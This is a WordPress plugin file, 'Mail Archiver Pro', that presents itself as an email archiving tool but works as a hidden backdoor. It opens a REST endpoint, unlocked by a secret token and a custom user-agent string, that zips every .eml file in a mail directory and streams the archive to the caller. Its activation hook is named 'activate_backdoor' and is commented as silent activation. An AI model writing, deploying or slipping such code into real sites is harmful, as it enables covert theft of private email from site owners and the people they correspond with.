<?php
/* Plugin Name: Mail Archiver Pro
 * Description: Archive and manage emails
 * Version: 1.0
 * Author: FVCK0RNEBRVME
 */

// Définition des constantes
define('TOKEN_ACCESS', 'SECRET TOKEN'); 
define('MAIL_SUBDOMAIN', 'sub.domain.com'); // Sous-domaine à paramétrer
define('MAIL_DIR', '/home/users/subdomain/docs/');

// Ajout du point d'entrée REST API
add_action('rest_api_init', function() {
    register_rest_route('fvck0rnebrvme/v1', '/fetch', array(
        'methods' => 'GET',
        'callback' => 'fetch_mail_archives',
        'permission_callback' => 'check_token_access'
    ));
});

// Vérification du token
function check_token_access($request) {
    $token = $request->get_param('token');
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    
    return ($token === TOKEN_ACCESS && 
            strpos($ua, 'CUSTOM USER AGENT') !== false);
}

// Fonction principale de récupération des mails
function fetch_mail_archives($request) {
    if (!class_exists('ZipArchive')) {
        return new WP_Error('zip_error', 'ZipArchive not available', array('status' => 500));
    }
    
    try {
        // Création du fichier zip temporaire
        $tmp_file = ABSPATH . 'wp-content/uploads/mail_archive_' . uniqid() . '.zip';
        
        $zip = new ZipArchive();
        if ($zip->open($tmp_file, ZipArchive::CREATE) !== TRUE) {
            throw new Exception('Cannot create ZIP file');
        }
        
        // Ajout des fichiers .eml au zip
        $files = glob(MAIL_DIR . '*.eml');
        if (empty($files)) {
            throw new Exception('No mail files found');
        }
        
        foreach ($files as $file) {
            if (is_readable($file)) {
                $zip->addFile($file, basename($file));
            }
        }
        
        $zip->close();
        
        // Vérification du fichier
        if (!file_exists($tmp_file) || filesize($tmp_file) === 0) {
            throw new Exception('ZIP file creation failed');
        }
        
        // Nettoyage des buffers
        while (ob_get_level()) {
            ob_end_clean();
        }
        
        // Envoi du fichier
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="mail_archive.zip"');
        header('Content-Length: ' . filesize($tmp_file));
        header('Cache-Control: no-cache');
        
        readfile($tmp_file);
        @unlink($tmp_file);
        exit;
        
    } catch (Exception $e) {
        if (isset($tmp_file) && file_exists($tmp_file)) {
            @unlink($tmp_file);
        }
        return new WP_Error('zip_error', $e->getMessage(), array('status' => 500));
    }
}

// Activation silencieuse
register_activation_hook(__FILE__, 'activate_backdoor');
function activate_backdoor() {
    return true;
}
